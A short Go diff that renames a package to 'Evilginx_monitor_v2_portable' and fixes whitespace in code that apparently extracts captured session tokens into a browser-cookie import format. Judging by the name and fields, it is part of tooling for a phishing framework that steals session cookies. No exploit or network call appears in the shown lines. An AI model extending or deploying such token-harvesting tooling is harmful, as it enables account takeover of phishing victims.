@@ -1,4 +1,4 @@
-package main
+package Evilginx_monitor_v2_portable
 
 import (
 	"encoding/json"
@@ -8,7 +8,6 @@ import (
 	"path/filepath"
 	"sync"
 	"time"
-
 )
 
 type Token struct {
@@ -23,7 +22,7 @@ type Token struct {
 	Session          bool        `json:"session"`
 	FirstPartyDomain string      `json:"firstPartyDomain"`
 	PartitionKey     interface{} `json:"partitionKey"`
-	ExpirationDate   *int64       `json:"expirationDate,omitempty"`
+	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
 	StoreID          interface{} `json:"storeId"`
 }
 
@@ -71,7 +70,7 @@ func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 			if pk, ok := tokenData["PartitionKey"]; ok {
 				t.PartitionKey = pk
 			}
-			
+
 			if storeID, ok := tokenData["storeId"]; ok {
 				t.StoreID = storeID
 			} else if storeID, ok := tokenData["StoreID"]; ok {
